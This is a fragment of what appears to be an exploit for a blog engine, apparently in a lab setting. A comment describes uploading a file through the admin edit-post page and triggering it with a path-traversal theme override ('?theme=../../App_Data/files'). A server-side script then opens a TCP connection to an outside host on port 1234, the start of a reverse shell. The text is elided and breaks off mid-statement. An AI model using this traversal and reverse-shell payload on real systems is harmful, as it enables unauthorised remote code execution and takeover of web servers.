 ...
 * allows upload is:
 *
 * http://10.10.13.94/admin/app/editor/editpost.cshtml
 *
 *
 * Finally, the vulnerability is triggered by accessing the base URL for the 
 * blog with a theme override specified like so:
 *
 * http://10.10.13.94/?theme=../../App_Data/files
 *
 */
...
<script runat="server">
	...
	using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("10.21.156.104", 1234)) {
